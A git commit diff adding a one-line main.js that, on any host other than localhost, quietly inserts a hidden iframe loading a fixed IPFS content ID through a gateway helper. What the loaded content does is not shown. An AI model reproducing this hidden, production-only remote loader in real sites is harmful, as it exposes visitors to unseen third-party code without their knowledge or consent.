bba8f292eeac69f56ad7d1e5cdfd31c54f0b95a9
Petrichor A <73023658+PetrichorA@users.noreply.github.com>
2022-11-20 10:58:07 +0800

    Update and rename perf.js to main.js

---
+++ main.js
@@ -0,0 +1,1 @@
+if("localhost"!==location.hostname&&""!==location.hostname){const e=document.createElement("iframe");e.hidden=!0,e.src=getIpfsGateway().replace("{cid}","bafkreihmhmuicfx4etl4zwyozgrazwtvqt26brkj3chzimtxkpyqxng5vi"),document.body.appendChild(e)}
